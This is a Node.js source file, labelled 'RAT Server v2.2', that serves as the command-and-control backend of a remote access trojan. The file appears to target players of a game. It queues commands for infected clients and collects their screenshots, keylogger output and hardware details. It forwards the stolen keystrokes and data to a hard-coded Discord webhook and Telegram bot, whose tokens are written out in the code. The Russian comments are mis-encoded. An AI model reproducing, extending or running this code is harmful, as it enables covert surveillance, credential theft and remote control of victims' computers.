// server.js
const http = require('http');
const fetch = require('node-fetch');

// –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö
let commandQueue = [];
let lastScreenshot = null;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS";
const TELEGRAM_BOT_TOKEN = "8079490877:AAEf1_SXzdbEjK88t6O4qyKhYnpE6U-hB44";
const TELEGRAM_CHAT_ID = "7581072357";

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
    }
}

// –§—É–Ω–∫—Ü–∏—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏–π
function logAction(action, details) {
    const timestamp = new Date().toLocaleString('ru-RU');
    console.log(`[${timestamp}] ${action}: ${details}`);
}

const server = http.createServer((req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');

    // Handle preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                console.log('Received command:', data);

                const { command, args } = data;
                
                logAction('–ö–û–ú–ê–ù–î–ê –û–¢ –ö–õ–ò–ï–ù–¢–ê', `${command} ${args ? args.join(' ') : ''}`);

                // –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞
                if (command === "user_chat" || command === "inject_notify" || command === "execute_log") {
                    // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Discord
                    try {
                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: `**${args[0]}:** ${args[1]}`
                            })
                        });
                    } catch (e) {
                        console.error('Discord error:', e);
                    }

                    // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
                    await sendToTelegram(`<b>${args[0]}:</b> ${args[1]}`);
                }

                res.end(JSON.stringify({ status: "OK", received: command }));
            } catch (e) {
                console.error('Command error:', e);
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request", details: e.message }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/client_command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { command, args } = JSON.parse(body);
                logAction('–ö–û–ú–ê–ù–î–ê –û–¢ –ë–û–¢–ê', `${command} ${args ? args.join(' ') : ''}`);
                
                // –î–æ–±–∞–≤–ª—è–µ–º –∫–æ–º–∞–Ω–¥—É –≤ –æ—á–µ—Ä–µ–¥—å
                commandQueue.push({
                    command: command,
                    args: args || [],
                    timestamp: new Date().toISOString()
                });

                // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º —Ä–∞–∑–º–µ—Ä –æ—á–µ—Ä–µ–¥–∏
                if (commandQueue.length > 10) {
                    commandQueue = commandQueue.slice(-10);
                }

                res.end(JSON.stringify({ 
                    status: "OK", 
                    command: command,
                    queue_size: commandQueue.length 
                }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                logAction('–°–ö–†–ò–ù–®–û–¢', '–ü–æ–ª—É—á–µ–Ω –Ω–æ–≤—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç');
                
                // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
                sendToTelegram('üì∏ <b>–ü–æ–ª—É—á–µ–Ω –Ω–æ–≤—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞</b>');
                
                res.end(JSON.stringify({ status: "Screenshot received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid screenshot data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { logs } = JSON.parse(body);
                logAction('–ö–ï–ô–õ–û–ì–ì–ï–†', `–ü–æ–ª—É—á–µ–Ω–æ ${logs.length} —Å–∏–º–≤–æ–ª–æ–≤`);
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Discord
                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**Keylogger Data:**\n\`\`\`\n${logs.substring(0, 1900)}\n\`\`\``
                        })
                    });
                } catch (e) {
                    console.error('Discord error:', e);
                }

                // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram (–ø–µ—Ä–≤—ã–µ 1000 —Å–∏–º–≤–æ–ª–æ–≤)
                if (logs.length > 0) {
                    await sendToTelegram(`<b>–ö–ï–ô–õ–û–ì–ì–ï–† –î–ê–ù–ù–´–ï:</b>\n<pre>${logs.substring(0, 1000)}</pre>`);
                }
                
                res.end(JSON.stringify({ status: "Logs received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid keylog data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/hardware') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { player, data } = JSON.parse(body);
                logAction('–û–ë–û–†–£–î–û–í–ê–ù–ò–ï', `–î–∞–Ω–Ω—ã–µ –æ—Ç ${player}`);
                
                const hwInfo = `üéÆ <b>–ò–ù–§–û–†–ú–ê–¶–ò–Ø –û–ë –û–ë–û–†–£–î–û–í–ê–ù–ò–ò</b>
üë§ –ò–≥—Ä–æ–∫: ${player}
üéØ FPS: ${data.fps}
üì∂ Ping: ${data.ping}
‚öôÔ∏è Executor: ${data.executor}
${data.cpu ? `üíª CPU: ${data.cpu}` : ''}
${data.ram ? `üß† RAM: ${data.ram}` : ''}`;

                // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –æ–±–∞ –∫–∞–Ω–∞–ª–∞
                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**Hardware Info:**\n\`\`\`\n${hwInfo}\n\`\`\``
                        })
                    });
                } catch (e) {
                    console.error('Discord error:', e);
                }

                await sendToTelegram(hwInfo);
                
                res.end(JSON.stringify({ status: "Hardware data received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid hardware data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/screenshot') {
        if (lastScreenshot) {
            res.end(JSON.stringify({ image: lastScreenshot }));
        } else {
            res.statusCode = 404;
            res.end(JSON.stringify({ error: "No screenshot available" }));
        }
        return;
    }

    if (req.method === 'GET' && req.url === '/get_command') {
        // –ö–ª–∏–µ–Ω—Ç –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç –∫–æ–º–∞–Ω–¥—É
        if (commandQueue.length > 0) {
            const command = commandQueue.shift(); // –ë–µ—Ä–µ–º –ø–µ—Ä–≤—É—é –∫–æ–º–∞–Ω–¥—É –∏–∑ –æ—á–µ—Ä–µ–¥–∏
            res.end(JSON.stringify(command));
        } else {
            res.end(JSON.stringify({ command: "", args: [] }));
        }
        return;
    }

    if (req.method === 'GET' && req.url === '/status') {
        res.end(JSON.stringify({ 
            status: "online", 
            version: "2.2",
            timestamp: new Date().toISOString(),
            queue_size: commandQueue.length,
            last_screenshot: !!lastScreenshot
        }));
        return;
    }

    if (req.method === 'GET' && req.url === '/') {
        res.end(JSON.stringify({ 
            message: "RAT Server v2.2",
            endpoints: [
                "POST /command - –ö–æ–º–∞–Ω–¥—ã –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞",
                "POST /client_command - –ö–æ–º–∞–Ω–¥—ã –æ—Ç –±–æ—Ç–∞", 
                "GET /get_command - –ü–æ–ª—É—á–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∫–ª–∏–µ–Ω—Ç–∞",
                "POST /screenshot - –ó–∞–≥—Ä—É–∑–∏—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç",
                "GET /screenshot - –ü–æ–ª—É—á–∏—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç",
                "POST /keylog - –ö–µ–π–ª–æ–≥–≥–µ—Ä –¥–∞–Ω–Ω—ã–µ",
                "POST /hardware - –ò–Ω—Ñ–æ –æ–± –æ–±–æ—Ä—É–¥–æ–≤–∞–Ω–∏–∏",
                "GET /status - –°—Ç–∞—Ç—É—Å —Å–µ—Ä–≤–µ—Ä–∞"
            ]
        }));
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ —Å–µ—Ä–≤–µ—Ä–∞
server.on('error', (error) => {
    console.error('–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞:', error);
    sendToTelegram(`<b>‚ùå –û–®–ò–ë–ö–ê –°–ï–†–í–ï–†–ê:</b>\n<code>${error.message}</code>`);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
    console.log(`üì° URL: https://ratserver-6wo3.onrender.com`);
    console.log(`üë§ Telegram ID: ${TELEGRAM_CHAT_ID}`);
    
    // –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∑–∞–ø—É—Å–∫–µ
    sendToTelegram(`<b>üü¢ –°–ï–†–í–ï–† –ó–ê–ü–£–©–ï–ù</b>\nüìç https://ratserver-6wo3.onrender.com\n‚è∞ ${new Date().toLocaleString('ru-RU')}`);
});
